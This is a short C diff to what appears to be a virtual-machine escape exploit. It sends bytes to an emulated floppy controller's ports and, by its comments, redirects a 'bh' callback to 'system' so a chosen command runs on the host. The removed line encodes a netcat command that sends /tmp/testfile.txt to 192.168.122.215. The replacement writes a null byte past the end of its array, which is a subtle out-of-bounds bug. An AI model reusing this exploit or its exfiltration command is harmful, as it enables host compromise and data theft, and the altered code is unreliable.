@@ -12,8 +12,11 @@
 #define NUM_STRUCT 0x00
 #define STRUCT_LEN 0x28
 int main(void){
-        unsigned char code[] = {'n','c',' ','1','9','2','.','1','6','8','.','1','2','2','.','2','1','5',' ','<','/','t','m','p','/','t','e','s','t','f','i','l','e','.','t','x','t', '\0'};  //this can be a input of the function
+
+        unsigned char code[] = "mktemp";  //this can be a input of the function
         int len_of_command = sizeof(code)/(sizeof(char));
+        code[len_of_command] = '\0';
+        len_of_command++;
         printf("len = %d\n", len_of_command);
     
          //rewrite bh structure to point to "system", where cb is system, opaque is the string address
@@ -33,7 +36,7 @@ int main(void){
             outb(TEST_VAL,0x3f5);
         }
         //write shell code
-        for(i=0;i<SH_COUNT; i++){
+        for(i=0;i<len_of_command; i++){
             outb(code[i], FIFO);
         }
         // go to bh struct
